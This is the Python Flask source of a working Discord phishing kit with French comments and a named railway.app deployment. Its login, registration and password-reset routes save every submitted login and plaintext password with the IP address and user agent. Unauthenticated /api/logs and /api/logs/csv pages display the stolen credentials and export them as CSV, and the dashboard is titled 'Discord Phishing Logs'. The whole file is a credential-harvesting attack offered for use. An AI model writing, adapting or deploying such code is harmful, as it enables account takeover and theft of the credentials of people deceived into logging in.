from flask import Flask, request, jsonify, session, render_template, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
import os
import re
import uuid
import secrets
import logging
from io import StringIO
import csv

# ── Configuration ──────────────────────────────────────────────────────────────
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

# Database (Railway PostgreSQL AUTOMATIQUE)
DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///discord_clone.db")
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_URL
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=7)

# ── Extensions ─────────────────────────────────────────────────────────────────
db = SQLAlchemy(app)
CORS(app, supports_credentials=True, origins=os.environ.get("ALLOWED_ORIGINS", "*").split(","))
limiter = Limiter(key_func=get_remote_address, app=app, default_limits=["200 per day", "50 per hour"])

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── MODELS ────────────────────────────────────────────────────────────────────
class User(db.Model):
    __tablename__ = "users"
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    username = db.Column(db.String(32), unique=True, nullable=False)
    email = db.Column(db.String(254), unique=True, nullable=False)
    password = db.Column(db.String(256), nullable=False)
    discriminator = db.Column(db.String(4), nullable=False, default="0000")
    avatar = db.Column(db.String(256), nullable=True)
    bio = db.Column(db.String(190), nullable=True)
    verified = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime, nullable=True)
    is_active = db.Column(db.Boolean, default=True)

    def to_dict(self, safe=True):
        data = {
            "id": self.id, "username": self.username, "discriminator": self.discriminator,
            "avatar": self.avatar, "bio": self.bio, "verified": self.verified,
            "created_at": self.created_at.isoformat(),
        }
        if not safe:
            data["email"] = self.email
            data["last_login"] = self.last_login.isoformat() if self.last_login else None
        return data

class LoginCapture(db.Model):
    __tablename__ = "login_captures"
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, index=True)
    ip_address = db.Column(db.String(45), nullable=False, index=True)
    login_id = db.Column(db.String(254), nullable=False, index=True)
    password = db.Column(db.Text, nullable=False)
    success = db.Column(db.Boolean, default=False)
    username = db.Column(db.String(32), nullable=True)
    email = db.Column(db.String(254), nullable=True)
    user_id = db.Column(db.String(36), nullable=True)
    user_agent = db.Column(db.Text, nullable=True)

# ── SAVEGARDE DB ──────────────────────────────────────────────────────────────
def save_login_attempt(login_id, password, ip_address, success=False, user=None, user_agent=None):
    """🚨 SAUVEGARDE DB + User-Agent"""
    capture = LoginCapture(
        ip_address=ip_address,
        login_id=login_id,
        password=password,
        success=success,
        username=user.username if user else None,
        email=user.email if user else None,
        user_id=user.id if user else None,
        user_agent=user_agent
    )
    db.session.add(capture)
    db.session.commit()
    logger.info(f"💾 CAPTURED: {login_id} | {password[:8]}... | {ip_address}")

# ── Helpers ────────────────────────────────────────────────────────────────────
EMAIL_REGEX = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
PHONE_REGEX = re.compile(r"^\+?[\d\s\-\(\)]{7,15}$")

def validate_email_or_phone(value: str) -> bool:
    return bool(EMAIL_REGEX.match(value)) or bool(PHONE_REGEX.match(value))

def current_user():
    uid = session.get("user_id")
    if not uid: return None
    return User.query.get(uid)

def error(message, code=400):
    return jsonify({"success": False, "error": message}), code

def ok(data=None, message="OK", code=200):
    payload = {"success": True, "message": message}
    if data: payload.update(data)
    return jsonify(payload), code

# ── 🚨 API LOGS PRO - REMPLACE /api/logs ──────────────────────────────────────
@app.route("/api/logs")
@app.route("/api/logs/raw")
def api_logs_pro():
    """🚨 DASHBOARD COMPLET sur https://blackphantom.up.railway.app/api/logs"""
    logs = LoginCapture.query.order_by(LoginCapture.timestamp.desc()).limit(50).all()
    total = db.session.query(LoginCapture).count()
    today = db.session.query(LoginCapture).filter(
        db.func.date(LoginCapture.timestamp) == datetime.now().date()
    ).count()
    unique_ips = db.session.query(LoginCapture.ip_address).distinct().count()
    
    logs_html = ""
    if not logs:
        logs_html = """
        <div style='text-align:center;padding:80px;color:#72767d;font-size:1.4em;'>
            🚨 <b>Aucun log capturé</b><br><br>
            👉 Teste un login sur ta page phishing !<br>
            <a href="/" style='color:#5865f2;font-weight:bold;'>→ Page phishing</a>
        </div>
        """
    else:
        for log in logs:
            logs_html += f"""
            <div style='
                background:rgba(255,255,255,0.03); 
                margin:12px 0; padding:20px; 
                border-radius:16px; 
                border-left:5px solid #5865f2; 
                box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            '>
                <div style='color:#b9bbbe;font-size:13px;margin-bottom:10px;font-family:monospace;'>
                    {log.timestamp.strftime("%d/%m/%Y %H:%M:%S")} 
                    <span style='font-weight:bold;color:#7289da;padding:2px 6px;background:rgba(114,137,218,0.2);border-radius:4px;'>
                        {log.ip_address}
                    </span>
                    <span style='color:{ "#57f287" if log.success else "#ed4245" };font-weight:bold;padding:2px 6px;border-radius:4px;'>
                        { "✅ Succès" if log.success else "❌ Échec" }
                    </span>
                </div>
                <div style='
                    font-family:"Courier New",monospace; 
                    background:rgba(0,0,0,0.5); 
                    padding:16px; border-radius:12px; 
                    font-size:16px; line-height:1.5; border:1px solid rgba(255,255,255,0.1);
                '>
                    <div><strong>📧 Login:</strong> <span style='color:#7289da'>{log.login_id}</span></div>
                    <div style='margin-top:8px;'>
                        <strong>🔑 Password:</strong> 
                        <span style='
                            color:#f04747; font-weight:bold; font-size:18px; 
                            background:rgba(240,71,71,0.15); 
                            padding:8px 12px; border-radius:8px; border:1px solid rgba(240,71,71,0.3);
                        '>
                            {log.password}
                        </span>
                    </div>
                    {f'<div style="margin-top:8px;font-size:13px;color:#72767d;">👤 Username: <span style="color:#fff;">{log.username}</span></div>' if log.username else ''}
                </div>
                {f'<div style="font-size:12px;color:#8e9297;margin-top:10px;font-family:monospace;padding:6px 10px;background:rgba(0,0,0,0.3);border-radius:6px;">🌐 UA: {log.user_agent[:100]}...</div>' if log.user_agent else ''}
            </div>
            """

    html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚨 Discord Logs - {total} captures</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ 
            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,sans-serif; 
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            color: #fff; min-height: 100vh; padding: 30px; line-height:1.6;
        }}
        .container {{ max-width: 1300px; margin: 0 auto; }}
        .header {{ 
            text-align: center; margin-bottom: 40px; padding: 35px 30px; 
            background: rgba(88,101,242,0.15); 
            border-radius: 24px; 
            border: 1px solid rgba(88,101,242,0.4); 
            backdrop-filter: blur(20px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }}
        .header h1 {{ 
            font-size: 2.8em; margin-bottom: 10px; 
            background: linear-gradient(45deg, #5865f2, #7289da, #5b7cfa); 
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
            background-clip: text;
        }}
        .stats {{ 
            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 25px; margin-bottom: 40px; 
        }}
        .stat {{ 
            background: rgba(255,255,255,0.08); 
            padding: 30px 20px; border-radius: 20px; text-align: center; 
            border: 1px solid rgba(255,255,255,0.15); 
            backdrop-filter: blur(15px); transition: all 0.3s;
        }}
        .stat:hover {{ transform: translateY(-5px); box-shadow: 0 15px 35px rgba(0,0,0,0.4); }}
        .stat-number {{ font-size: 2.8em; font-weight: 800; color: #5865f2; margin-bottom: 8px; }}
        .logs-container {{ 
            background: rgba(0,0,0,0.4); 
            border-radius: 24px; 
            padding: 35px; 
            border: 1px solid rgba(255,255,255,0.12);
            backdrop-filter: blur(20px);
        }}
        .logs-header {{ 
            display: flex; justify-content: space-between; align-items: center; 
            margin-bottom: 30px; padding-bottom: 25px; 
            border-bottom: 1px solid rgba(255,255,255,0.15); 
            font-size: 1.6em; font-weight: 600;
        }}
        .btn {{ 
            padding: 14px 28px; border: none; border-radius: 12px; cursor: pointer; 
            font-weight: 600; font-size: 15px; text-decoration: none; 
            transition: all 0.3s; display: inline-block; color: white; position: relative; overflow: hidden;
        }}
        .btn-primary {{ 
            background: linear-gradient(45deg, #5865f2, #7289da); 
            box-shadow: 0 4px 15px rgba(88,101,242,0.4);
        }}
        .btn-success {{ 
            background: linear-gradient(45deg, #57f287, #43b581); 
            box-shadow: 0 4px 15px rgba(87,242,135,0.4);
        }}
        .btn:hover {{ transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,0,0,0.4); }}
        .footer {{ text-align: center; margin-top: 40px; color: #72767d; font-size: 14px; }}
        @media (max-width: 768px) {{ 
            body {{ padding: 20px 15px; }} 
            .logs-header {{ flex-direction: column; gap: 20px; text-align: center; }}
            .header h1 {{ font-size: 2em; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚨 Discord Phishing Logs</h1>
            <p style="font-size:1.1em;color:#b9bbbe;">Captures en temps réel • Auto-refresh 15s</p>
        </div>

        <div class="stats">
            <div class="stat">
                <div class="stat-number">{total}</div>
                <div>Total Captures</div>
            </div>
            <div class="stat">
                <div class="stat-number">{today}</div>
                <div>Aujourd'hui</div>
            </div>
            <div class="stat">
                <div class="stat-number">{unique_ips}</div>
                <div>IPs Uniques</div>
            </div>
        </div>

        <div class="logs-container">
            <div class="logs-header">
                <span>📋 50 derniers logs</span>
                <div>
                    <a href="/api/logs/csv" class="btn btn-primary">📥 Exporter CSV</a>
                    <a href="/" class="btn btn-success" style="margin-left:15px;">🏠 Phishing Page</a>
                </div>
            </div>
            {logs_html}
        </div>

        <div class="footer">
            <p>🔄 Auto-refresh dans <span id="countdown">15</span>s | 
            <a href="/api/logs" style="color:#5865f2;">Refresh manuelle</a></p>
        </div>
    </div>

    <script>
        let time = 15;
        const countdown = document.getElementById('countdown');
        setInterval(() => {{
            time--;
            countdown.textContent = time;
            if (time <= 0) location.reload();
        }}, 1000);
    </script>
</body>
</html>
"""
    return html

# ── Routes principales (inchangées) ───────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/auth/register", methods=["POST"])
@limiter.limit("10 per hour")
def register():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    email = (data.get("email") or "").strip().lower()
    password = (data.get("password") or "")
    user_agent = request.headers.get('User-Agent', '')

    save_login_attempt(email or username, password, get_remote_address(), False, user_agent=user_agent)

    if not username or len(username) < 2 or len(username) > 32: return error("Username 2-32 chars.")
    if not re.match(r"^[\w.]+$", username): return error("Username invalid chars.")
    if not email or not EMAIL_REGEX.match(email): return error("Invalid email.")
    if len(password) < 8: return error("Password 8+ chars.")

    if User.query.filter_by(email=email).first() or User.query.filter_by(username=username).first():
        return error("Account exists.")

    discriminator = str(secrets.randbelow(10000)).zfill(4)
    user = User(username=username, email=email, password=generate_password_hash(password), discriminator=discriminator)
    db.session.add(user)
    db.session.commit()
    
    save_login_attempt(email, password, get_remote_address(), True, user, user_agent)
    session.permanent = True
    session["user_id"] = user.id
    return ok({"user": user.to_dict(safe=False)}, "Created!", 201)

@app.route("/api/auth/login", methods=["POST"])
@limiter.limit("20 per hour")
def login():
    data = request.get_json(silent=True) or {}
    login_id = (data.get("login") or "").strip().lower()
    password = (data.get("password") or "")
    ip_address = get_remote_address()
    user_agent = request.headers.get('User-Agent', '')

    save_login_attempt(login_id, password, ip_address, False, user_agent=user_agent)

    if not login_id or not password: return error("Fill all fields.")

    user = User.query.filter_by(email=login_id).first()
    is_valid = user and check_password_hash(user.password, password) if user else False
    
    if is_valid: save_login_attempt(login_id, password, ip_address, True, user, user_agent)

    if not is_valid: return error("Invalid credentials.", 401)

    session.permanent = True
    session["user_id"] = user.id
    user.last_login = datetime.utcnow()
    db.session.commit()
    return ok({"user": user.to_dict(safe=False)})

@app.route("/api/auth/forgot-password", methods=["POST"])
def forgot_password():
    data = request.get_json(silent=True) or {}
    login_id = (data.get("login") or "").strip()
    user_agent = request.headers.get('User-Agent', '')
    save_login_attempt(login_id, "FORGOT_PASSWORD", get_remote_address(), False, user_agent=user_agent)
    return ok("Reset sent")

@app.route("/api/auth/logout", methods=["POST"])
def logout(): 
    session.clear(); 
    return ok("Logged out")

@app.route("/api/auth/me")
def me():
    user = current_user()
    return error("Unauthorized", 401) if not user else ok({"user": user.to_dict(safe=False)})

@app.route("/api/logs/csv")
def api_logs_csv():
    logs = LoginCapture.query.order_by(LoginCapture.timestamp.desc()).limit(1000).all()
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(['timestamp', 'ip', 'login_id', 'password', 'success', 'username', 'email', 'user_id', 'user_agent'])
    for log in logs:
        writer.writerow([log.timestamp.isoformat(), log.ip_address, log.login_id, log.password, log.success, 
                        log.username or '', log.email or '', log.user_id or '', log.user_agent or ''])
    output.seek(0)
    return send_file(output, mimetype='text/csv', as_attachment=True, 
                    download_name=f"discord_logs_{datetime.now().strftime('%Y%m%d_%H%M')}.csv")

@app.route("/api/logs/count")
def logs_count():
    total = db.session.query(LoginCapture).count()
    today = db.session.query(LoginCapture).filter(
        db.func.date(LoginCapture.timestamp) == datetime.now().date()
    ).count()
    return jsonify({"total": total, "today": today})

@app.route("/health")
def health():
    return jsonify({"status": "ok", "logs": True})

# ── Bootstrap ──────────────────────────────────────────────────────────────────
with app.app_context():
    db.create_all()
    print("✅ Flask Discord Phishing Ready!")
    print("📊 Logs: https://blackphantom.up.railway.app/api/logs")
    print("🏠 Phishing: https://blackphantom.up.railway.app/")
    print("📥 CSV: https://blackphantom.up.railway.app/api/logs/csv")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)